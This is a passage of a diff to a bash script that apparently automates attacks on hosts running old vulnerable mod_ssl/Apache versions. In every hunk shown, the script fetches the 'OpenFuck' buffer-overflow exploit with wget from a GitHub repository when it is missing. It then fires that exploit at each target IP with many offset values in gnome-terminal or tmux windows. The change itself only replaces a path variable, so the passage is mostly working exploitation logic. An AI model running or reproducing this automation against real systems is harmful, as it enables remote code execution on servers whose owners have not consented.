+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1232,20 +1232,20 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1256,34 +1256,34 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x46 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x56 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x57 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x58 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5e $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5f $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x46 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x56 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x57 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x58 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x5e $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x5f $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x46 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x56 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x57 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x58 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5e $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5f $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x46 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x56 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x57 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x58 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x5e $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x5f $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1294,22 +1294,22 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1320,30 +1320,30 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x62 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x66 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x67 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x68 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x62 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x66 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x67 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x68 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x62 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x66 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x67 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x68 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x62 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x66 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x67 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x68 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1354,28 +1354,28 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5a $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5b $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x74 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x5a $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x5b $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x74 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x74 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5a $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5b $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x74 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x5a $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x5b $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1386,22 +1386,22 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x52 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x52 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1412,23 +1412,23 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1439,23 +1439,23 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1466,21 +1466,21 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
